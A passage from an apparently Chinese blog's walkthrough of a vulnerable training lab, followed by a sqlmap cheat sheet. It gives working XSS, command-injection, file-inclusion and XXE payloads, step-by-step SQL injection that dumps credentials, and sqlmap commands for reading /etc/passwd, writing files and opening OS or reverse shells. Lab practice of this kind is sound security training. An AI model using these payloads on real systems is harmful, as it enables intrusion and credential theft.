payload\n\n```js\n<script>alert(1)</script>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221510986.png)\n\n\n\n## DOM-XSS\n需要先将前面的a标签闭合\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221516245.png)\n\n- payload\n    ```js\n    ' onclike='alert(1)'\n    ```\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205221522590.png)\n\n\n## DOM-XSS-X\n输入框输入的内容会被拼接为url\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221525149.png)\n\n- payload\n\n```js\n'><img src=\"#\" onmouseover=\"alert('xss')\">\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221532373.png)\n\n\n\n## XSS盲打\n无回显,有输入框就插入js\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221536427.png)\n\n到后台查看\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221536452.png)\n\n\n\n## XSS之过滤\n大小写绕过\n\n- payload\n```js\n<SCRipt>alert(1)</SCRIPt>\n```\n\n## XSS之htmlspecialchars\n<>被过滤\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221547770.png)\n\n- payload\n```js\n' onclick='alert(1)'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221550582.png)\n\n\n\n## XSS之href\n输入会被拼接到href属性里,单引号无法闭合,使用`javascript:`来执行js代码\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221556988.png)\n\n- payload\n```js\njavascript:alert(/xss/)\n```\n\n## XSS之js输出\n插入js后发现没被闭合,将前面的标签闭合掉\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221602105.png)\n\n- payload\n```js\n</script><script>alert(/123/)</script>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221604616.png)\n\n\n# CSRF\n    CSRF(跨站请求伪造)概述\n    Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为\"one click\"攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。\n    这里列举一个场景解释一下，希望能够帮助你理解。\n    场景需求：\n    小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。\n    先看下大白是如何修改自己的密码的：\n    登录---修改会员信息，提交请求---修改成功。\n    所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。\n    但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？\n    于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：\n    【http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Change】\n    于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。\n    为啥小黑的操作能够实现呢。有如下几个关键点：\n    1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;\n    ---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。\n    2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;\n    ---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。\n    ---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。\n    当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。\n    ---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。\n    因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：\n    --对敏感信息的操作增加安全的token；\n    --对敏感信息的操作增加安全的验证码；\n    --对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。\n\n\n## CSRF(GET)\n使用google和edge分别登录两个不同的账号\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232046252.png)\n\n使用google浏览器抓包修改数据包,发送给csrf poc\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232050882.png)\n\n生成poc\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232052249.png)\n\n复制url到edge打开\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232057945.png)\n\n可以看到edge登录的账号个人信息已经修改\n\n## CSRF(GET)\n同上,只不过换了请求方式\n\n\n## CSRF(TOKEN)\n跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了。\n\n\n# RCE\n    RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。\n    远程系统命令执行\n    一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口\n    比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上\n    一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器\n    现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过\"自动化运维平台\"进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的\"收获\"-_-\n\n    远程代码执行\n    同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。\n    因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。\n    你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。\n\n## exec \"ping\"\n使用`|`,管道符,将前一个命令执行的结果拿后面一个命令\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205241601018.png)\n\n\n## exec eval\n会执行php代码\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205241604192.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205241605900.png)\n\n\n# FILE INCLUDE\n    文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：\n    include(),include_once()\n    require(),require_once()\n    这些文件包含函数，这些函数在代码设计中被经常使用到。\n    大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：\n    1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。\n    2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。\n    因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。\n   \n\n## file include(local)\n读取/etc/passwd\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262128057.png)\n\n\n## file include(remote)\n远程包含一句话\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262146838.png)\n\n# unsafe filedownload\n复制图片下载链接,替换,会下载/etc/passwd文件\n![](https://raw.githubusercontent.com/chencicici/images/main/202205271501023.png)\n\n\n# 越权\n    如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。\n    一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。\n    因此，在在权限管理中应该遵守：\n    1.使用最小权限原则对用户进行赋权;\n    2.使用合理（严格）的权限校验规则;\n    3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;\n    你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。\n\n## 水平越权\n先登录lucy账号\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272040293.png)\n\n修改url为其他账号\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272041852.png)\n\n产生水平越权\n\n\n## 垂直越权\n登录管理员账号,并添加用户\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272044689.png)\n\n抓取添加用户的数据包\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272053361.png)\n\n登录普通用户,抓取数据包,替换cookie到刚刚抓取的管理员数据包中的cookie\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272104878.png)\n\n以普通用户的cookie进行操作\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272106863.png)\n\n再次登录管理员账号,查看\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272107993.png)\n\n添加用户成功\n\n# sql注入\n    在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。\n    SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。\n\n## 分隔符和注释符\n- url使用`空格`或者`%20`\n- burp使用 `+`\n- get使用 `--+` 注释\n- post使用 `#` 注释\n\n## 注入常用函数\n- like ‘ro%’            # 判断ro或ro…是否成立\n- regexp ‘^xiaodi[a-z]’ # 正则,匹配xiaodi及xiaodi…等\n- if(条件,5,0)           # 条件成立 返回5 反之 返回0\n- sleep(5)              # SQL语句延时执行5秒\n- mid(a,b,c)            # 从位置b开始，截取a字符串的c位\n- substr(a,b,c)         # 从b位置开始，截取字符串a的c长度,从1开始\n- left(database(),1)    # 从左侧截取a的前b位\n- length(database())=8  # 判断数据库当前库名的长度\n- ord=ascii ascii(x)=97 # 判断x的ascii码是否等于97\n- limit(a,b)            # 限制行数,从a条记录开始,返回b条记录 limit(1,1)\n## 数字型注入(POST)\n1. 使用burpsuite抓包,对参数判断注入\n```bash\nid=1' and=1 &submit=%E6%9F%A5%E8%AF%A2\n```\n\n2. 报错,尝试注入\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151333668.png?token=ARYCSAS5X3DNSIBK2JN7L5DCQCIOO)\n\n3. 尝试注入,2列\n```bash\nid=1 order by 2&submit=%E6%9F%A5%E8%AF%A2\n```\n\n4. 爆出回显位\n```bash\nid=1 union select 1,2&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151335056.png?token=ARYCSAUNWHHQI3WY2EMVR6TCQCIUC)\n\n5. 爆库名\n```bash\nid=1 union select database(),user()&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151335214.png?token=ARYCSAXY7XPWYZ52NLBN633CQCIWC)\n\n6. 爆表名\n```bash\nid=1  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151336796.png?token=ARYCSASKTPN6D7C276OH2MTCQCIZY)\n\n7. 爆字段\n```bash\nid=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'\n&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151336584.png?token=ARYCSARJ2QB3VIHRUF7BBGLCQCI3C)\n\n8. 爆数据\n```bash\nid=1 union select 1,(select concat(0x7e,group_concat(username,password),0x7e) from users )#\n&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151337610.png?token=ARYCSAXFRTG7KB3R6NRVTQDCQCI4S)\n\n\n\n## 字符型(get)\n\n1. 判断注入,字符型一般都需要闭合\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'1\n```\n报错,说明是由 `'` 引起的注入\n\n\n2. 万能密码\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=aa'  or 1=1  --+\n```\n会爆出所有账号密码\n\n\n3. 判断列\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=aa'  order by 2  --+\n```\n回显正常说明2列\n\n4. 爆所有库名\n```\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'  union select 1,group_concat(schema_name) from information_schema.schemata--+\n```\n\n5.爆表名\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n```\n\n6.爆列名\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'  union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+\n```\n\n7.爆数据\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'  union select (select group_concat(username) from users),((select group_concat(password) from users))--+\n```\n\n## 搜索型注入\n\n1. 判断注入\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1' \n```\n基于 `'` 注入\n\n2. 万能密码\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1' or 1=1 --+\n```\n会爆出所有密码\n\n3. 猜解列名\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1' order by 3 --+ \n```\n3回显正常,4报错,说明有3列\n\n4. 爆数据\n如上\n   \n\n## xx型注入\n1. 判断注入\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_x.php?name=1' --+\n```\n报错\n\n2. 闭合语句\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_x.php?name=1')  and 1 = 1 --+\n```\n基于 `')` 引起的注入\n\n3. 爆库\n步骤如上\n   \n   \n## insert&update注入\n\n\n### insert\n注册为insert注入,首先注册\n\n1. 判断注入\n```bash\nadd=&email=&password=123&phonenum=&sex=&submit=submit&username=aa'\n```\n由 `'` 引起报错\n\n2. 爆库\n```bash\nadd=&email=&password=qwe&phonenum=&sex=&submit=submit&username=123'  and extractvalue(0x0a,concat(0x0a,(select database())))  and '# \n```\n使用报错注入,必须要报错,所以使用 `and` 让语句报错\n\n\n3. 爆表名 \n```bash\nusername=123'  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32)))  and  ' #\n```\n但是报错注入`只会报出32个字符`,所以要使用偏移量substr\n\n4. 爆列名\n```bash\nusername=123' and \nextractvalue (1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,32),0x7e)) and  ' #\n```\n\n5. 爆数据\n```bash\n&username=123'  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(username) from users),1,32)))  and  ' #\n\n&username=123'  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(password) from users),1,32)))  and  ' #\n```\n\n### update\n修改个人信息为update注入,先注册后登录\n\n1. 判断注入点\n```bash\nadd=123'&email=111&phonenum=111&sex=%E7%94%B7&submit=submit\n```\n由 `'` 引起报错\n\n2. 爆库名\n```bash\nadd=123' and extractvalue(0x0a,concat(0x0a,(select database()))) #&email=111&phonenum=111&sex=%E7%94%B7&submit=submit \n```\n\n3. 爆表名\n```bash\nadd=123' and extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) \n```\n\n4. 后续操作如上\n\n\n## delete注入\n\n1. 判断注入\n```bash\n?id=56'  --+\n```\n由 `'` 引起报错\n\n\n2. 爆库名\n```bash\n?id=56 and  extractvalue(0x0a,concat(0x0a,(select database()))) --+\n```\n使用报错注入\n\n## http头注入\n1. 抓包判断注入\n由 `'` 引起的注入\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151339050.png?token=ARYCSAQFEL42LGPO2MJ7EX3CQCJDS)\n\n\n2. 注入\n```bash\n1' and extractvalue(0x0a,concat(0x0a,(select database()))) and ' #\n```\n此处需要使用 `and '` 闭合语句\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151338332.png?token=ARYCSAT4PLVT4OXNI4EO4VTCQCJBA)\n\n\n## 基于boolian的盲注\n没有回显,也没有报错信息,sqlmap直接梭哈\n```bash\nsqlmap -u 'http://localhost/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2#' --batch --threads 10 --dbs \n```\n\n## 基于时间的盲注\nsqlmap梭哈\n\n\n## 宽字节注入\n在PHP配置文件中magic_quotes_gpc=On或者使用addslashes函数，icov函数,mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号'，就会被自动转义\\'，这样就使得多数注入攻击无效。\n当输入单引号，假设这里我们使用addslashes转义，对应的url编码是：\n`' –>\\'–> %5c%27`\n当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：\n`%df' –> %df\\' –> (%df%5C)%27–>(数据库GBK)–>運'`\n前端输入**%df'时首先经过上面addslashes函数和浏览器url编码转义变成了%df%5c%27**\n因为数据库使用GBK编码的话，**%df%5c会被当作一个汉字处理,转换成了汉字”運”**，从而使%27（单引号）逃出生天，成功绕过,利用这个特性从而可实施SQL注入的利用。 [原文](https://jwt1399.top/posts/32179.html#toc-heading-75)\n\n1. 爆列数\n```bash\nname=1%df'  union select 1,2# &submit=%E6%9F%A5%E8%AF%A2\n```\n2. 爆库名\n```bash\nname=1%df'  union select 1,database()# &submit=%E6%9F%A5%E8%AF%A2\n```\n\n#  unsafe upfileupload \n文件上传\n\n## 客户端check\n前端校验,抓包修改\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151515028.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151516450.png)\n\n## 服务端check\n检查MIME,一样抓包修改\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151529002.png)\n\n## getimagesize()\n上传图片马,配合文件包含漏洞或者解析漏洞\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151534906.png)\n\n\n\n# php反序列化\n\n抓包可以发现是post方式,参数为o\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021257491.png)\n\n## 代码审计\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021256413.png)\n \n以post接受传参o的值,如果是序列化数据输出到html,否则打印\"\"大兄弟,来点劲爆点儿的\"\n\n## 构造payload\n\n```php\nclass S{\n    \n    var $test = \"<script>alert('xss')</script>\";\n}\n$a = new s();\necho(serialize($a));\n```\n输出\n```\nO:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021304135.png)\n\n\n# SSRF\n    SSRF(Server-Side Request Forgery:服务器端请求伪造)\n    其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制\n    导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据\n    数据流:攻击者----->服务器---->目标地址\n    根据后台使用的函数的不同,对应的影响和利用方法又有不一样\n    PHP中下面函数的使用不当会导致SSRF:\n```php\nfile_get_contents()\nfsockopen()\ncurl_exec()\n```\n\n## SSRF(CURL)\n读取本地文件\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232147803.png)\n\n\n## SSRF(file_get_contents)\n同上\n\n\n# XXE\n    XXE -\"xml external entity injection\"\n    既\"xml外部实体注入漏洞\"。\n    概括一下就是\"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题\"\n    也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。\n    现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。\n    以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。\n\n##漏洞危害：\n1.读取系统文件；\n\n2.执行系统命令；\n\n3.探测内网端口；\n\n4.攻击内部网络。\n\n## 漏洞防御：\nxxe漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。\n因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。\n构造一个恶意的payload，通过外部实体引用从而去获取后台服务器的本地文件信息(注：外部引用可以支持http，file，ftp等协议。)\n\n## payload\n```xml\n<?xml version = \"1.0\"?>\n\n<!DOCTYPE ANY [\n\n<!ENTITY f SYSTEM \"file:///etc/passwd\">\n\n]>\n\n<x>&f;</x>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206031812341.png)","tags":["sql注入","靶场"],"categories":["靶场"]},{"title":"sqlmap使用","url":"/2022/04/28/sqlmap使用/","content":"## 参数\n- -u  #注入点 \n- -f  #指纹判别数据库类型 \n- -b  #获取数据库版本信息 \n- -p  #指定可测试的参数(?page=1&id=2 -p \"page,id\") \n- -D \"\"  #指定数据库名 \n- -T \"\"  #指定表名 \n- -C \"\"  #指定字段 \n- -s \"\"  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s \"xx.log\"　　恢复:-s \"xx.log\" --resume) \n- --level=(1-5) #要执行的测试水平等级，默认为1 \n- --risk=(0-3)  #测试执行的风险等级，默认为1 \n- --time-sec=(2,5) #延迟响应，默认为5 \n- --data #通过POST发送数据 \n- --columns        #列出字段 \n- --current-user   #获取当前用户名称 \n- --current-db     #获取当前数据库名称 \n- --users          #列数据库所有用户 \n- --passwords      #数据库用户所有密码 \n- --privileges     #查看用户权限(--privileges -U root) \n- -U               #指定数据库用户 \n- --dbs            #列出所有数据库 \n- --tables -D \"\"   #列出指定数据库中的表 \n- --columns -T \"user\" -D \"mysql\"#列出mysql数据库中的user表的所有字段\n- --dump-all            #列出所有数据库所有表 \n- --exclude-sysdbs      #只列出用户自己新建的数据库和表 \n- --dump -T \"\" -D \"\" -C \"\"   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) \n- --dump -T \"\" -D \"\" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 \n- --dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) \n- --os      #指定系统(Linux,Windows) \n- -v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 \n    1.显示信息和警告消息。 \n    2：显示调试消息。 \n    3：有效载荷注入。 \n    4：显示HTTP请求。 \n    5：显示HTTP响应头。 \n    6：显示HTTP响应页面的内容 \n- --privileges  #查看权限 \n- --is-dba      #是否是数据库管理员 \n- --roles       #枚举数据库用户角色 \n- --udf-inject  #导入用户自定义函数（获取系统权限） \n- --union-check  #是否支持union 注入 \n- --union-cols #union 查询表记录 \n- --union-test #union 语句测试 \n- --union-use  #采用union 注入 \n- --union-tech orderby #union配合order by \n- --data \"\" #POST方式提交数据(--data \"page=1&id=2\") \n- --cookie \"用;号分开\"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer \"\"     #使用referer欺骗(--referer \"http://\") \n- --user-agent \"\"  #自定义user-agent\n- --random-agent #随机ua \n- -- tamper #使用防过滤脚本 \n- --proxy \"http://127.0.0.1:8118\" #代理注入 \n- --string=\"\"    #指定关键词,字符串匹配. \n- --threads 　　  #采用多线程(--threads 3) \n- --sql-shell    #执行指定sql命令 \n- --sql-query    #执行指定的sql语句(--sql-query \"SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1\" ) \n- --file-read    #读取指定文件 \n- --file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) \n- --file-dest    #要写入的文件绝对路径 \n- --os-cmd=id    #执行系统命令 \n- --os-shell     #系统交互shell \n- --os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) \n- --msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) \n- --os-smbrelay  # \n- --os-bof       # \n- --reg-read     #读取win系统注册表 \n- --priv-esc     # \n- --time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p \"user-agent\" --user-agent \"sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)\"  #指定user-agent注入 \n- --eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 \n    common-outputs.txt \n    common-tables.txt      表字典 \n    keywords.txt \n    oracle-default-passwords.txt \n    user-agents.txt \n    wordlist.txt \n## 常用语句\n```bash\n1. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0\n \n2. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2\n \n3. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2\n \n4. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C \"user,pass\"  -v 1 --exclude-sysdbs\n \n5. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 \n\n6. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read \"c:\\boot.ini\" -v 2 \n\n7. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2\n \n8. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd \"id\" -v 1 \n\n9. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 \n\n10. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1\n \n11. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1\n \n12. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1\n \n13. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=\"HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap\" --reg-value=Test --reg-type=REG_SZ --reg-data=1\n \n14. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta\n \n15. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -p id --prefix \"')\" --suffix \"AND ('abc'='abc\"\n\n16. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --auth-type Basic --auth-cred \"testuser:testpass\"\n\n17. /sqlmap.py -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\"\n\n18. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3\n \n19. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --sql-query \"SELECT 'foo'\" -v 1\n \n20. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --common-tables -D testdb --banner\n \n21. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --cookie=\"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low\" --string='xx' --dbs --level=3 -p \"uid\"\n```\n\n\n## 注入流程\n1. 读取数据库版本，当前用户，当前数据库 \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 \n```\n\n2. 判断当前数据库用户权限\n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 \n```\n\n3. 读取所有数据库用户或指定数据库用户的密码\n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 \n```\n\n4. 获取所有数据库 \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 \n```\n\n5. 获取指定数据库中的所有表 \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2\n``` \n\n6. 获取指定数据库名中指定表的字段 \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2\n```\n \n7. 获取指定数据库名中指定表中指定字段的数据 \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C \"username,password\" -s \"sqlnmapdb.log\" -v 2 \n```\n8. file-read读取web文件 \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read \"/etc/passwd\" -v 2\n``` \n9. file-write写入文件到web \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file 